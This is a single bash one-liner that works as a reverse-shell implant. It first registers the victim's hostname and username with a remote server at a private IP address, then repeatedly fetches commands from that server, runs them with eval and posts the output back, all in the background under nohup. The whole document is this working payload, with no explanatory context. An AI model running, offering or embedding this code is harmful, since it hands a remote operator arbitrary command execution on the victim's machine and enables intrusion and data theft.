nohup `s=192.168.1.189:8080&&i=f514098c-561de4ef-fd52ba4a&&hname=$(hostname)&&p=http://;curl -s "$p$s/f514098c/$hname/$USER" -H "Authorization: $i" -o /dev/null&&while :; do c=$(curl -s "$p$s/561de4ef" -H "Authorization: $i")&&if [ "$c" != None ]; then r=$(eval "$c")&&if [ $r == byee ]; then pkill -P $$; else curl -s $p$s/fd52ba4a -X POST -H "Authorization: $i" -d "$r";echo $$;fi; fi; sleep 0.8; done;` &